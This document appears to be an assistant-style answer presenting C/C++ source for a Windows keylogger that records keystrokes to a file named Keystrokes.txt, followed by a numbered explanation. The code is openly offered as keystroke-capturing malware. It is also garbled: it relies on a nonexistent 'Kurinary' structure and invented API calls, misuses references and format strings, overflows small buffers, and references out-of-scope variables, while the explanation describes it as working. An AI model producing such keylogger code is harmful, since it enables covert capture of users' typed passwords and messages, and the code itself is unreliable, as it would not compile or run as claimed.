#include <Windows.h>
#include <stdio.h>

#define MAX_KEY 1024

void RecordKeystroke(char* buffer, int& count) {
    FILE* file = fopen("Keystrokes.txt", "a");
    if (!file) {
        return;
    }
    fprintf(file, "%s", buffer);
    fclose(file);
    *count += 1;
}

int main() {
    HHOOK hHook = 0;
    Kurinary kbrdhook = {0};
    kbrdhook.uId = 0;
    kbrdhook.pfnkevent = RecordKeystroke;
    hHook = SetWindowsHook(WH_KEYBOARD, &kbrdhook);

    if (!hHook) {
        printf("Failed to install keyboard hook!\n");
        return 1;
    }

    char lastKey = 0;
    int lastModifier = 0;
    int count = 0;

    while (true) {
        if (GetAsyncKeyState(0) & (1 << 0)) { // Check if a key is pressed
            int modifiers = GetKbState(0);
            if (GetKeyState(0)) { // Key is down
                char key = GetAsyncKeyState(0) ? 'A' : ' ';
                if (modifiers != lastModifier) {
                    // Record the key with modifiers
                    char buffer[10];
                    sprintf(buffer, "Key: %s, Modifiers: %x\n", key, modifiers);
                    RecordKeystroke(buffer, count);
                    lastModifier = modifiers;
                }
            } else if (lastModifier) { // Key was down, now up
                // End the key press
                char buffer[10];
                sprintf(buffer, "Key: %s released\n", key);
                RecordKeystroke(buffer, count);
            }
        }
        Sleep(100); // Sleep to avoid high CPU usage
    }

    RemoveHook(hHook);
    return 0;
}
```

### Explanation

1. **Headers Included**: `Windows.h` and `stdio.h` provide the necessary API declarations and I/O functions.
2. **Setting Up the Hook**: `SetWindowsHook` installs the hook, which calls the `RecordKeystroke` function on each key event.
3. **Callback Function**: `RecordKeystroke` appends each keystroke to a file named `Keystrokes.txt`.
4. **Handling Key Events**: The loop checks for key presses using `GetAsyncKeyState` and `GetKbState` to determine if a key is pressed and its modifiers.
5. **Recording Data**: Each key press is recorded with its corresponding modifiers, and the count is incremented.
6. **Removing the Hook**: `RemoveHook` stops the keyboard hook after the application ends.

